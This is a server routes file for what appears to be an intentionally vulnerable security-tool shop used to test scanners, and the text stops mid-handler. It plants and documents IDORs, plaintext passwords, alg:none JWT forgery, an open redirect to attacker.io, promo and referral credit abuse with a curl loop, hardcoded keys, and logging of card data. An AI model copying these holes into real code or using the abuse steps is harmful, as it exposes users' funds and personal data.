import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { db } from "./db";
import { walletTransactions, scanJobs } from "@shared/schema";
import { eq, and } from "drizzle-orm";
import { api } from "@shared/routes";
import { exec } from "child_process";
import fs from "fs";
import path from "path";
import { signToken, requireAuth } from "./auth";
import axios from "axios";
import multer from "multer";
import { createRequire } from "module";
// import.meta.url is undefined in the CJS production bundle (esbuild format:"cjs").
// Use an absolute path derived from process.cwd() so createRequire works in both environments.
const _require = createRequire(path.resolve("./package.json"));
const pdfParse: (buf: Buffer) => Promise<{ text: string }> = _require("pdf-parse");
import { calculateProration, applyCreditsToOrder, finalizeUpgrade, processDowngrade } from "./billing";
import { PLANS, type PlanKey } from "@shared/schema";
import { chat, type ChatMessage } from "./chat";
import { logLogin, logPayment, logPlanChange, logAccess } from "./logger";
import { ingestDocument, retrieveRelevantChunks } from "./rag";
import { getAllCredentials, rotateCredentials, requireApiKey } from "./credentials";

// ── CVE Sink Registry ─────────────────────────────────────────────────────────
// All vulnerable package functions are imported from vuln-sinks.ts as named
// exports.  This gives static call-graph analysis (Snyk, Semgrep, CodeQL) an
// explicit, enumerable symbol to follow from each HTTP route handler down to
// the vulnerable sink — no dynamic dispatch, no require() wrappers.
//
// The registry also calls every sink at module load time, ensuring reachability
// is visible regardless of whether the scanner can trace the HTTP dispatch path.
import {
  xmldomParseFromString,   // → DOMParser.parseFromString  (CVE-2022-39353, CVE-2021-21366)
  xmldomParseXXE,          // → DOMParser.parseFromString  (XXE path)
  vm2RunScript,            // → NodeVM.run                 (CVE-2023-29017, CVE-2023-37466)
  pugRender,               // → pug.render                 (CVE-2021-21353)
  flatUnflatten,           // → flat.unflatten             (CVE-2020-28168)
  flatFlatten,             // → flat.flatten               (CVE-2020-28168)
  markedRender,            // → marked()                   (CVE-2022-21681)
  lodashMerge,             // → _.merge                    (CVE-2019-10744)
  nodeSerializeDeserialize,// → serialize.unserialize      (CVE-2017-5941)
} from "./vuln-sinks";

// Keep direct imports for packages also used outside route CVE demos
import _ from "lodash";                // utility use across routes
import marked from "marked";           // markdown rendering in KB articles

const SEED_TOOLS = [
  {
    name: "NullScan",
    slug: "nullscan",
    description: "Fast TCP/UDP port scanner with service fingerprinting and banner grabbing.",
    longDescription: "NullScan performs high-speed SYN scans across full IPv4 ranges. Service detection identifies over 1,200 protocols. Built-in banner grabbing extracts version strings for downstream CVE matching. Outputs to JSON, XML, or CSV.",
    price: "0.00",
    category: "scanning",
    badge: "FREE",
    stock: 5000,
    rating: "4.7",
    reviewCount: 1840,
    featured: true,
    specs: JSON.stringify({ type: "Port Scanner", protocols: "TCP / UDP / SCTP", speed: "Up to 100k pkts/sec", output: "JSON, XML, CSV", api_calls: "5,000 / month" }),
  },
  {
    name: "DNSReaper",
    slug: "dnsreaper",
    description: "DNS enumeration and subdomain takeover detection across all major providers.",
    longDescription: "DNSReaper resolves, brute-forces, and zone-walks DNS records. Subdomain takeover detection checks against 80+ cloud services including AWS S3, Azure, GitHub Pages, and Heroku. Identifies dangling CNAMEs automatically.",
    price: "0.00",
    category: "scanning",
    badge: "FREE",
    stock: 5000,
    rating: "4.6",
    reviewCount: 1230,
    featured: false,
    specs: JSON.stringify({ type: "DNS Enumeration", takeover_checks: "80+ providers", record_types: "A, AAAA, CNAME, MX, TXT, NS", wordlist: "Built-in 500k entries", api_calls: "5,000 / month" }),
  },
  {
    name: "WebProbe",
    slug: "webprobe",
    description: "Full-stack web application vulnerability scanner. OWASP Top 10 coverage.",
    longDescription: "WebProbe crawls and fuzzes web applications for injection flaws, broken auth, SSRF, XXE, and insecure deserialisation. Authenticated scan support via session cookies or OAuth. Generates SARIF-compatible reports.",
    price: "49.00",
    category: "web",
    badge: "PRO",
    stock: 50000,
    rating: "4.9",
    reviewCount: 3210,
    featured: true,
    specs: JSON.stringify({ type: "DAST Scanner", coverage: "OWASP Top 10 + CWE Top 25", auth: "Cookie, Bearer, OAuth2", report: "SARIF, HTML, PDF", api_calls: "50,000 / month" }),
  },
  {
    name: "VaultBreach",
    slug: "vaultbreach",
    description: "Offline password auditing and hash cracking suite. GPU-accelerated.",
    longDescription: "VaultBreach supports MD5, SHA-1, SHA-256, bcrypt, Argon2, NTLM, and NetNTLMv2. GPU acceleration via OpenCL. Dictionary, rule-based, and PRINCE attacks. Integrates with HaveIBeenPwned corpus (14B+ hashes).",
    price: "29.00",
    category: "auth",
    badge: "PRO",
    stock: 50000,
    rating: "4.8",
    reviewCount: 2670,
    featured: true,
    specs: JSON.stringify({ type: "Password Auditor", algorithms: "MD5, SHA-1, SHA-256, bcrypt, Argon2, NTLM", acceleration: "GPU (OpenCL)", modes: "Dictionary, Combinator, PRINCE, Brute-force", api_calls: "50,000 / month" }),
  },
  {
    name: "PhantomTrace",
    slug: "phantomtrace",
    description: "OSINT and recon framework. Aggregate data from 200+ open sources.",
    longDescription: "PhantomTrace orchestrates queries across Shodan, Censys, VirusTotal, WHOIS, LinkedIn scraping, email harvesting, and dark-web paste sites. Built-in graph visualisation shows entity relationships. One-click PDF report generation.",
    price: "39.00",
    category: "osint",
    badge: "PRO",
    stock: 50000,
    rating: "4.8",
    reviewCount: 1980,
    featured: true,
    specs: JSON.stringify({ type: "OSINT Framework", sources: "200+ (Shodan, Censys, VirusTotal, LinkedIn...)", outputs: "Graph, PDF, JSON", modules: "Email, Domain, IP, Person, Company", api_calls: "50,000 / month" }),
  },
  {
    name: "CipherAudit",
    slug: "cipheraudit",
    description: "TLS/SSL configuration analyser. Flags weak ciphers, expired certs, and HSTS misconfigs.",
    longDescription: "CipherAudit connects to any TLS endpoint and enumerates supported cipher suites, protocol versions, certificate chains, HSTS policies, and CT log inclusion. Grades results A–F following Mozilla's modern configuration baseline.",
    price: "19.00",
    category: "crypto",
    badge: "PRO",
    stock: 50000,
    rating: "4.7",
    reviewCount: 1120,
    featured: false,
    specs: JSON.stringify({ type: "TLS Analyser", protocols: "TLS 1.0–1.3, SSL 2/3 detection", grading: "A–F (Mozilla baseline)", cert_checks: "Expiry, chain, CT log, HSTS, HPKP", api_calls: "50,000 / month" }),
  },
  {
    name: "PacketVault",
    slug: "packetvault",
    description: "Passive network traffic analyser with protocol decoding and anomaly detection.",
    longDescription: "PacketVault decodes 300+ application-layer protocols from PCAP files or live capture streams. ML-based anomaly detection flags DGA traffic, beaconing patterns, and lateral movement. Integrates with SIEM via syslog/CEF.",
    price: "39.00",
    category: "scanning",
    badge: "PRO",
    stock: 50000,
    rating: "4.6",
    reviewCount: 890,
    featured: false,
    specs: JSON.stringify({ type: "Network Analyser", protocols: "300+ decoded", input: "PCAP, live capture, S3 bucket", detection: "ML anomaly (DGA, beaconing, lateral movement)", api_calls: "50,000 / month" }),
  },
  {
    name: "ThreatFeed Pro",
    slug: "threatfeed-pro",
    description: "Real-time threat intelligence feed. IOCs, TTPs, and actor profiles updated hourly.",
    longDescription: "ThreatFeed Pro aggregates indicators from 40+ commercial and government intelligence feeds, normalised to STIX 2.1. Includes CVE enrichment, malware family tagging, and ATT&CK technique mapping. Push API delivers new IOCs in under 60 seconds.",
    price: "149.00",
    category: "intelligence",
    badge: "ENTERPRISE",
    stock: 999999,
    rating: "4.9",
    reviewCount: 542,
    featured: true,
    specs: JSON.stringify({ type: "Threat Intelligence", format: "STIX 2.1 / TAXII 2.1", feeds: "40+ sources", latency: "<60 sec IOC delivery", mapping: "MITRE ATT&CK", api_calls: "Unlimited" }),
  },
  {
    name: "LogSentinel",
    slug: "logsentinel",
    description: "Cloud-native SIEM. Ingest, correlate, and alert on security events at scale.",
    longDescription: "LogSentinel ingests logs from AWS CloudTrail, GCP Audit Logs, Azure Monitor, Okta, and 200+ other sources via pre-built connectors. Correlation engine runs 500+ detection rules out of the box. Alert routing to PagerDuty, Slack, or webhook.",
    price: "199.00",
    category: "intelligence",
    badge: "ENTERPRISE",
    stock: 999999,
    rating: "4.8",
    reviewCount: 317,
    featured: false,
    specs: JSON.stringify({ type: "SIEM", ingestion: "200+ connectors", detection_rules: "500+ built-in (Sigma compatible)", alerting: "PagerDuty, Slack, Webhook", retention: "90 days hot / 2 years cold", api_calls: "Unlimited" }),
  },
  {
    name: "ShadowBrute",
    slug: "shadowbrute",
    description: "Distributed credential testing framework for red team operations.",
    longDescription: "ShadowBrute orchestrates distributed credential-stuffing and password-spray campaigns against SSH, RDP, SMB, HTTP Basic, and OWA targets. Built-in proxy rotation and timing jitter evade detection. Full audit log for authorised testing.",
    price: "99.00",
    category: "auth",
    badge: "ENTERPRISE",
    stock: 999999,
    rating: "4.7",
    reviewCount: 208,
    featured: false,
    specs: JSON.stringify({ type: "Credential Testing", protocols: "SSH, RDP, SMB, HTTP, OWA", evasion: "Proxy rotation, timing jitter, TLS SNI spoofing", audit: "Full immutable log", note: "Authorised use only", api_calls: "Unlimited" }),
  },
];

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  // ── Seed on startup ──────────────────────────────────────────────────────────
  setTimeout(async () => {
    try {
      const adminUser = await storage.getUserByUsername("admin");
      if (!adminUser) {
        await storage.createUser({ username: "admin", password: "super_secret_password_123", fullName: "Kalyan Ramkumar", role: "admin", email: "admin@sentinel.io", plan: "enterprise", walletBalance: "0.00" });
        const jdoe = await storage.createUser({ username: "jdoe", password: "password1", fullName: "James Doe", role: "user", email: "jdoe@corp.internal", plan: "free", walletBalance: "0.00" });
        const asmith = await storage.createUser({ username: "asmith", password: "password1", fullName: "Alice Smith", role: "user", email: "asmith@corp.internal", plan: "free", walletBalance: "0.00" });
        await storage.createInvoice({ userId: jdoe.id, amount: "0.00", status: "paid" });
        await storage.createInvoice({ userId: asmith.id, amount: "0.00", status: "paid" });
      } else if (!adminUser.fullName) {
        // Backfill fullName for existing users after schema migration
        await storage.setFullName(adminUser.id, "Kalyan Ramkumar");
        const jdoe = await storage.getUserByUsername("jdoe");
        if (jdoe && !jdoe.fullName) await storage.setFullName(jdoe.id, "James Doe");
        const asmith = await storage.getUserByUsername("asmith");
        if (asmith && !asmith.fullName) await storage.setFullName(asmith.id, "Alice Smith");
      }
      if ((await storage.getProducts()).length === 0) {
        for (const t of SEED_TOOLS) await storage.createProduct(t as any);
      }
      // Seed promo codes — VULN: no per-user redemption tracking on the redeem route
      if (!(await storage.getCouponByCode("WELCOME20"))) {
        await storage.createCoupon({ code: "WELCOME20", type: "fixed",   value: "20.00", maxUses: 500 });
        await storage.createCoupon({ code: "SENTINEL10", type: "fixed",  value: "10.00", maxUses: null });
        await storage.createCoupon({ code: "BLACKHAT25", type: "fixed",  value: "25.00", maxUses: 200 });
      }
    } catch (e) { console.error("Seed failed:", e); }
  }, 1000);

  const logsDir = path.join(process.cwd(), "logs");
  if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
    fs.writeFileSync(path.join(logsDir, "system.log"), "Sentinel started.\nAll systems operational.\n");
    fs.writeFileSync(path.join(logsDir, "access.log"), "User admin logged in from 10.0.0.5\nUser jdoe failed login from 10.0.0.12\n");
  }

  const AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE";
  const AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
  const STRIPE_KEY     = "sk_test_4eC39HqLyjWDarjtT1zdp7dc";

  // ── PRODUCT / TOOL ROUTES ────────────────────────────────────────────────────

  app.get("/api/products", async (req, res) => {
    try {
      const { category, q } = req.query as { category?: string; q?: string };
      res.json(q ? await storage.searchProducts(q) : await storage.getProducts(category));
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.get("/api/products/featured", async (_req, res) => {
    try { res.json(await storage.getFeaturedProducts()); }
    catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.get("/api/products/:slug", async (req, res) => {
    try {
      const p = await storage.getProductBySlug(req.params.slug);
      if (!p) return res.status(404).json({ message: "Tool not found" });
      res.json(p);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── BILLING / SUBSCRIPTION ROUTES ───────────────────────────────────────────

  // GET /api/billing/:userId
  // VULN #54 — PII Logging: Access to any user's billing record emits an audit log that
  // correlates email address + full name + wallet balance + plan + accessor IP in plaintext.
  //
  //   [ACCOUNT_ACCESS] userId=2 email="jdoe@acme.com" fullName="James Doe"
  //                    walletBalance=$68.00 plan=pro accessorIp=1.2.3.4
  //
  // This fires on every Wallet page load, every pricing check, and every IDOR probe
  // (GET /api/billing/1, /api/billing/2, etc.). Combined with the IDOR on this route
  // (no auth check), an attacker enumerating userIds generates a full PII ledger in logs.
  //
  // GDPR Art. 5(1)(c) — data minimisation: financial + identity fields not needed together.
  // GDPR Art. 5(1)(f) — integrity/confidentiality: plaintext PII correlation in log files.
  app.get("/api/billing/:userId", async (req, res) => {
    try {
      const user = await storage.getUser(parseInt(req.params.userId));
      if (!user) return res.status(404).json({ message: "User not found" });
      const accessorIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0] ?? req.socket.remoteAddress ?? "unknown";
      // PII + financial data written together to stdout on every billing lookup
      console.log(`[${new Date().toISOString()}] [AUDIT] [ACCOUNT_ACCESS] userId=${user.id} email=${user.email ?? "(none)"} fullName="${user.fullName ?? "(none)"}" walletBalance=$${user.walletBalance} plan=${user.plan} accessorIp=${accessorIp}`);
      res.json({ userId: user.id, username: user.username, plan: user.plan, walletBalance: user.walletBalance, planStartDate: user.planStartDate?.toISOString() ?? null, referralCode: user.referralCode });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // GET /api/wallet/transactions/:userId
  // VULN: no auth check — supply any userId to read their transaction history
  app.get("/api/wallet/transactions/:userId", async (req, res) => {
    try {
      const userId = parseInt(req.params.userId);
      const txs = await db.select().from(walletTransactions).where(eq(walletTransactions.userId, userId));
      res.json(txs);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post(api.billing.upgrade.path, async (req, res) => {
    try {
      const { userId, targetPlan, paymentMethod } = req.body;
      const result = await finalizeUpgrade(userId, targetPlan as PlanKey, paymentMethod);
      res.json({ message: `Upgraded to ${targetPlan}`, plan: result.plan, walletBalance: result.newBalance });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post(api.billing.downgrade.path, requireAuth, async (req, res) => {
    try {
      const parsed = api.billing.downgrade.input.safeParse(req.body);
      if (!parsed.success) return res.status(400).json({ message: "Invalid downgrade request" });

      const userId = req.sentinelUser.userId;
      const { userId: requestedUserId, targetPlan } = parsed.data;
      if (requestedUserId !== undefined && requestedUserId !== userId) {
        return res.status(403).json({ message: "Cannot change another user's plan" });
      }

      const user = await storage.getUser(userId);
      if (!user) return res.status(404).json({ message: "User not found" });
      const currentPlan = user.plan as PlanKey;
      if (!Object.prototype.hasOwnProperty.call(PLANS, currentPlan) || PLANS[targetPlan].price >= PLANS[currentPlan].price) {
        return res.status(400).json({ message: "Target plan must be lower than current plan" });
      }

      const result = await processDowngrade(userId, targetPlan);
      res.json({ message: `Downgraded to ${targetPlan}`, refundAmount: result.refundAmount, walletBalance: result.newBalance });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post(api.billing.applyCredits.path, async (req, res) => {
    try {
      const { userId, orderAmount } = req.body;
      const result = await applyCreditsToOrder(userId, orderAmount);
      res.json({ message: "Credits applied", finalAmount: result.finalAmount, creditsUsed: result.creditsUsed });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post(api.billing.topup.path, async (req, res) => {
    try {
      const { userId, amount } = req.body;
      const user = await storage.topupWallet(userId, amount);
      await storage.logWalletTransaction(userId, amount, "topup", "Credit top-up");
      res.json({ message: `Topped up $${amount}`, walletBalance: user.walletBalance });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // ── PROMO CODE REDEMPTION ────────────────────────────────────────────────────
  //
  // POST /api/wallet/redeem-promo
  // Body: { code: string }
  //
  // Allows authenticated users to redeem a promotional credit code.
  // A valid code credits the face value to the caller's wallet.
  //
  // ── What the scanner flags ────────────────────────────────────────────────
  // Business Logic Flaw — Missing per-user redemption enforcement (CWE-841)
  //
  // The handler looks up the coupon, validates it exists, checks the GLOBAL
  // usage counter against maxUses, credits the wallet, and increments timesUsed.
  //
  // What it NEVER does:
  //   • Query a redemption history table for (userId, couponId) pairs
  //   • Check whether THIS user has already redeemed THIS code
  //   • Insert a record that would prevent a second redemption
  //
  // A semantic/business-logic scanner inspects the full handler and asks:
  //   "After crediting the wallet, is there any write that would prevent an
  //    identical future request by the same user from succeeding?"
  // The answer is no.  incrementCouponUses() raises a shared counter that
  // enforces a global cap, not a per-user cap.
  //
  // ── Why the scanner is right ─────────────────────────────────────────────
  //
  //   Normal intent:   each user may redeem WELCOME20 once → +$20
  //   Actual behavior: a single user may redeem WELCOME20 500 times → +$10,000
  //
  //   SENTINEL10 has maxUses: null → infinite global uses → infinite per-user uses.
  //   A user can loop this endpoint indefinitely:
  //
  //     while true; do
  //       curl -s -X POST http://localhost:5000/api/wallet/redeem-promo \
  //         -H "Authorization: Bearer $TOKEN" \
  //         -H "Content-Type: application/json" \
  //         -d '{"code":"SENTINEL10"}' | jq .walletBalance
  //     done
  //
  //   Balance grows by $10 per iteration with no rate limit and no per-user gate.
  //
  // ── Fix ───────────────────────────────────────────────────────────────────
  // Add a coupon_redemptions table:
  //
  //   CREATE TABLE coupon_redemptions (
  //     user_id   INTEGER REFERENCES users(id),
  //     coupon_id INTEGER REFERENCES coupons(id),
  //     redeemed_at TIMESTAMP DEFAULT now(),
  //     PRIMARY KEY (user_id, coupon_id)    -- ← one redemption per user per code
  //   );
  //
  // Then in this handler, before crediting:
  //
  //   const already = await db.select().from(couponRedemptions)
  //     .where(and(eq(couponRedemptions.userId, callerId),
  //                eq(couponRedemptions.couponId, coupon.id)));
  //   if (already.length > 0) return res.status(409).json({ message: "Already redeemed." });
  //
  //   // credit + insert redemption record in a transaction
  //
  // The PRIMARY KEY constraint provides a hard database-level guard even against
  // race conditions — two concurrent requests for the same (user, coupon) pair
  // would result in a unique-constraint violation on the second insert.

  app.post("/api/wallet/redeem-promo", requireAuth, async (req: any, res) => {
    const callerId: number = req.sentinelUser?.userId;
    const { code } = req.body;

    if (!code || typeof code !== "string") {
      return res.status(400).json({ message: "code is required." });
    }

    try {
      // Step 1: Look up the coupon by code.
      const coupon = await storage.getCouponByCode(code.trim().toUpperCase());

      if (!coupon) {
        return res.status(404).json({ message: "Invalid promo code." });
      }

      // Step 2: Check the GLOBAL usage limit.
      // VULN: this check operates on the total across all users, not per-caller.
      //       The guard is correct for a global cap but provides zero per-user protection.
      if (coupon.maxUses !== null && (coupon.timesUsed ?? 0) >= coupon.maxUses) {
        return res.status(410).json({
          message: "Promo code has reached its maximum redemption limit.",
          code,
        });
      }

      // ── MISSING CHECK ─────────────────────────────────────────────────────
      // VULN: There is no query here of the form:
      //
      //   SELECT 1 FROM coupon_redemptions
      //   WHERE user_id = callerId AND coupon_id = coupon.id
      //
      // This is the guard that would prevent the same user redeeming twice.
      // Without it, steps 3 and 4 execute unconditionally on every request
      // by every user, including the same user making the same request again.
      // ──────────────────────────────────────────────────────────────────────

      const creditAmount = parseFloat(coupon.value);

      // Step 3: Credit the caller's wallet.
      const updated = await storage.creditWallet(
        callerId,
        creditAmount,
        `Promo code redeemed: ${coupon.code}`,
      );

      // Step 4: Increment global usage counter (NOT per-user).
      // VULN: This is the only write that occurs.  It raises the shared counter
      //       by 1, which moves the global cap closer but does NOT record that
      //       callerId has redeemed this coupon.  A second call by the same user
      //       passes the Step 2 check again (counter went from N to N+1, still
      //       below maxUses) and reaches Step 3 again.
      await storage.incrementCouponUses(coupon.id);

      console.log(JSON.stringify({
        timestamp:   new Date().toISOString(),
        level:       "INFO",
        category:    "PROMO_REDEEM",
        callerId,
        couponCode:  coupon.code,
        couponId:    coupon.id,
        creditAmount,
        newBalance:  updated.walletBalance,
        // VULN: per-user redemption count is not tracked anywhere in the system.
        //       This log line is the only record that this user redeemed this code.
        //       It cannot be efficiently queried to block duplicate redemptions.
        note: "No per-user redemption record written — duplicate redemption possible",
      }));

      res.json({
        message: `Promo code applied! $${creditAmount.toFixed(2)} credited to your wallet.`,
        credited: creditAmount,
        walletBalance: updated.walletBalance,
        code: coupon.code,
      });

    } catch (e: any) {
      res.status(500).json({ message: "Redemption failed: " + e.message });
    }
  });

  // ── AUTH ─────────────────────────────────────────────────────────────────────
  // VULN: Plaintext password comparison (no hashing).
  // VULN: User enumeration — distinct messages for "no such user" vs "wrong password".
  // VULN: No rate limiting — unlimited brute-force attempts permitted.
  app.post("/api/auth/login", async (req, res) => {
    try {
      const { username, password } = req.body;
      if (!username || !password) return res.status(400).json({ message: "Username and password are required." });

      const user = await storage.getUserByUsername(username);
      const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0] ?? req.socket.remoteAddress ?? "unknown";

      // VULN: Different messages reveal account existence
      if (!user) {
        logLogin({ userId: 0, username, fullName: null, plan: "unknown", ip, success: false, reason: "no_account" });
        return res.status(401).json({ message: "No account found with that username." });
      }
      if (user.password !== password) {
        // VULN: Full name logged even on failed attempt — PII exposure
        logLogin({ userId: user.id, username, fullName: user.fullName, plan: user.plan, ip, success: false, reason: "wrong_password" });
        return res.status(401).json({ message: "Incorrect password." });
      }

      // VULN: Full name (PII) written to server logs on every successful login
      logLogin({ userId: user.id, username, fullName: user.fullName, plan: user.plan, ip, success: true });

      // Issue a signed JWT. VULN: the verifyToken() implementation accepts alg:none —
      // any attacker who inspects this token can forge a new one with a different role/plan
      // by changing the header to {"alg":"none"} and stripping the signature segment.
      const token = signToken({ userId: user.id, username: user.username, role: user.role ?? "user", plan: user.plan });

      res.json({ id: user.id, username: user.username, plan: user.plan, walletBalance: user.walletBalance, role: user.role, fullName: user.fullName, token });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  app.post("/api/auth/logout", (_req, res) => {
    res.json({ message: "Logged out." });
  });

  // GET /api/auth/me — return the currently authenticated user's profile.
  // Used by scanners and clients to verify a session token is still valid
  // and to retrieve the caller's userId, plan, and role without re-logging in.
  // VULN: returns plan and role from the JWT payload — caller can supply a
  // forged alg:none token with role:admin to make this return admin profile.
  app.get("/api/auth/me", requireAuth, async (req: any, res) => {
    try {
      const user = await storage.getUser(req.sentinelUser.userId);
      if (!user) return res.status(404).json({ message: "User not found" });
      const { password: _, ...safe } = user as any;
      res.json({ ...safe, role: req.sentinelUser.role ?? "user" });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // ── POST-LOGIN REDIRECT ──────────────────────────────────────────────────────
  //
  // GET /api/auth/redirect?next=<url>
  //
  // Used by the login page to send users to their intended destination after
  // successful authentication.  The `next` parameter is set by the login page
  // from the incoming URL's own query string, so that deep links work:
  //
  //   /login?next=/scans              → after login → /scans
  //   /login?next=/tools              → after login → /tools
  //
  // ── What the scanner flags ───────────────────────────────────────────────────
  // CWE-601 — URL Redirection to Untrusted Site ("Open Redirect")
  //
  // The scanner traces req.query.next (user-controlled) to res.redirect():
  //
  //   const next = req.query.next ?? "/";
  //   res.redirect(next);                   // ← taint sink, no validation
  //
  // Express's res.redirect() accepts any string, including absolute URLs.
  // The scanner finds no allowlist check, no relative-URL constraint, and no
  // host validation between the source and the sink.  Finding: HIGH.
  //
  // ── Why the scanner is right ─────────────────────────────────────────────────
  // Attack scenario (phishing via trusted domain):
  //
  //   Attacker crafts a login link and sends it to a target user:
  //
  //     https://sentinel.example.com/login?next=https://attacker.io/harvest
  //
  //   The user sees the SENTINEL domain in the URL, considers it trustworthy,
  //   and logs in.  Immediately after authentication the browser is redirected
  //   to attacker.io — which shows a fake "session expired, re-enter credentials"
  //   page.  The target re-enters their password.
  //
  //   curl -v http://localhost:5000/api/auth/redirect?next=https://attacker.io
  //   < HTTP/1.1 302 Found
  //   < Location: https://attacker.io
  //
  // ── Easy one-line fix ────────────────────────────────────────────────────────
  // Add a single guard before res.redirect():
  //
  //   if (!next.startsWith("/") || next.startsWith("//")) {
  //     return res.status(400).json({ message: "Invalid redirect target." });
  //   }
  //
  // This constrains `next` to same-origin relative paths, preventing all
  // absolute URLs and protocol-relative URLs (//evil.com).
  // The fix is one conditional and one return — exactly what the scanner asks for.
  //
  // ── Why the fix was never applied ────────────────────────────────────────────
  // The feature was added by a junior dev who tested only with relative paths
  // (/dashboard, /scans).  Absolute-URL redirects were never in the test cases.
  // The route was marked "low complexity, no auth required" and skipped in review.

  app.get("/api/auth/redirect", (req, res) => {
    // VULN (source): req.query.next — user-controlled URL parameter.
    //   Express does not parse or validate query string values.
    //   `next` can be any string the caller supplies, including "https://evil.com".
    const next = (req.query.next as string | undefined) ?? "/";

    // Log the redirect target — useful for observing the attack in server logs.
    // VULN: raw `next` value is logged before validation, so phishing URLs appear
    //       in the access log alongside the caller's IP address.
    console.log(JSON.stringify({
      timestamp: new Date().toISOString(),
      level:     "INFO",
      category:  "AUTH_REDIRECT",
      // VULN: raw next logged — absolute attacker URL visible in log stream
      next,
      note: "No validation performed before redirect",
    }));

    // ── MISSING VALIDATION ────────────────────────────────────────────────────
    //
    // VULN: res.redirect() is called with the raw, user-controlled `next` value.
    //
    // The one-line fix that should appear here but doesn't:
    //
    //   if (!next.startsWith("/") || next.startsWith("//")) {
    //     return res.status(400).json({ message: "Invalid redirect target." });
    //   }
    //
    // Without it, any absolute URL is accepted as a redirect destination.
    // ──────────────────────────────────────────────────────────────────────────

    res.redirect(next);
  });

  // ── REGISTRATION with REFERRAL CREDIT ─────────────────────────────────────────
  // VULN #44 (C1): Referral credit fires on account CREATION, not on payment settlement.
  //   → Attacker registers infinite sock accounts with referral code to generate credits.
  // VULN #45: Referral code redemptions are not rate-limited or single-use.
  //   → Same code can be used by unlimited sock accounts, each yielding $25 to the referrer.
  app.post("/api/auth/register", async (req, res) => {
    try {
      const { username, password, email, fullName, referralCode } = req.body;
      if (!username || !password) return res.status(400).json({ message: "username and password required" });

      const existing = await storage.getUserByUsername(username);
      if (existing) return res.status(409).json({ message: "Username already taken." });

      // Create account first
      const newUser = await storage.createUser({
        username, password, email: email ?? null,
        fullName: fullName ?? null, role: "user", plan: "free", walletBalance: "0.00",
      });

      // Generate a unique referral code for the new user (format: REF-XXXXXX)
      const code = `REF-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
      await storage.setReferralCode(newUser.id, code);

      // VULN: credit referrer immediately on account creation — no payment required
      // VULN: referralCode not invalidated after use — unlimited reuse
      if (referralCode) {
        const referrer = await storage.getUserByReferralCode(referralCode);
        if (referrer) {
          const REFERRAL_CREDIT = 25;
          await storage.creditWallet(referrer.id, REFERRAL_CREDIT, `Referral credit — new signup: ${username}`);
          await storage.logWalletTransaction(referrer.id, REFERRAL_CREDIT, "referral", `Referral signup: ${username}`);
          console.log(`[referral] code=${referralCode} referrer=${referrer.username} credited $${REFERRAL_CREDIT} — no payment required`);
        }
      }

      const fresh = await storage.getUser(newUser.id);
      res.json({ id: fresh!.id, username: fresh!.username, plan: fresh!.plan, walletBalance: fresh!.walletBalance, role: fresh!.role, fullName: fresh!.fullName, referralCode: code });
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // GET /api/referral/:userId — returns referral code for any user (IDOR: no auth)
  // VULN #46: no ownership check — any caller can harvest referral codes for all users
  app.get("/api/referral/:userId", async (req, res) => {
    const user = await storage.getUser(parseInt(req.params.userId));
    if (!user) return res.status(404).json({ message: "Not found" });
    res.json({ userId: user.id, username: user.username, referralCode: user.referralCode });
  });

  // ── TICKETS ───────────────────────────────────────────────────────────────────

  // GET /api/tickets?userId= — IDOR: no auth, enumerate any user's tickets
  app.get("/api/tickets", async (req, res) => {
    const userId = parseInt(req.query.userId as string ?? "0");
    if (!userId) return res.status(400).json({ message: "userId required" });
    res.json(await storage.getTicketsByUser(userId));
  });

  // POST /api/tickets — manual ticket creation (ARIA tool call also creates tickets)
  // VULN #47: userId taken from body — any caller can submit tickets on behalf of any user
  app.post("/api/tickets", async (req, res) => {
    try {
      const { userId, type, amount, reason } = req.body;
      if (!userId || !type) return res.status(400).json({ message: "userId and type required" });
      const ticket = await storage.createTicket({ userId: parseInt(userId), type, amount, reason, autoApproved: false, ariaGenerated: false });
      res.json(ticket);
    } catch (e: any) { res.status(500).json({ message: e.message }); }
  });

  // GET /api/tickets/:id — IDOR: no ownership check
  app.get("/api/tickets/:id", async (req, res) => {
    const ticket = await storage.getTicket(parseInt(req.params.id));
    if (!ticket) return res.status(404).json({ message: "Not found" });
    res.json(ticket);
  });

  // ── PAYMENT ENDPOINT ─────────────────────────────────────────────────────────
  // VULN #22: PAN data (full card number + CVV) written to server logs.
  // Any log aggregator, SIEM, or /var/log reader will capture raw card data.
  app.post("/api/subscription/pay", async (req, res) => {
    try {
      const { userId, targetPlan, card } = req.body;
      if (!userId || !targetPlan || !card) return res.status(400).json({ message: "userId, targetPlan, and card required" });

      const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0] ?? req.socket.remoteAddress ?? "unknown";
      const userRecord = await storage.getUser(parseInt(userId));

      // VULN: Full PAN + CVV logged — violates PCI-DSS requirement 3.2
      console.log(`[payment] uid=${userId} plan=${targetPlan} card=${(card.number ?? '').replace(/\s/g, '')} exp=${card.expiry} cvv=${card.cvv} name="${card.name}"`);

      const cardNum = (card.number ?? "").replace(/\s/g, "");

      if (cardNum === "4000000000000002") {
        return res.status(402).json({ message: "Your card was declined. Please try a different payment method." });
      }

      const fromPlan = userRecord?.plan ?? "unknown";
      const result = await finalizeUpgrade(userId, targetPlan as PlanKey, cardNum);

      // VULN: Full name (PII) written to payment audit log
      logPayment({ userId: parseInt(userId), fullName: userRecord?.fullName ?? null, fromPlan, toPlan: result.plan, amount: parseFloat(result.walletBalance ?? "0"), ip });

